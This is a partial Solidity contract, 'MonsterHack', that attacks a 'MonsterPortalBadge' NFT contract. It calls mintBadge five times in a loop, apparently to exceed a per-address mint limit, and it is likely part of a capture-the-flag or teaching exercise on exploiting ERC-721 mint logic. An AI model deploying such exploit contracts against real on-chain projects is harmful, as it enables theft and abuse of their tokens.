...
import "./MonsterPortalBadge.sol";

contract MonsterHack is IERC721Receiver {
    
    MonsterPortalBadge public badgeContract;
    
    function initBadge(address _badgeAddress) external {
        badgeContract = MonsterPortalBadge(_badgeAddress);
    }
    ...
    function mintFiveBadgeAttack() external {
        for (uint i = 0; i < 5; i++) {
            badgeContract.mintBadge();
        }
    }
    ...
    function checkBalance() external view returns(uint) {
        return badgeContract.balanceOf(address(this));
    }
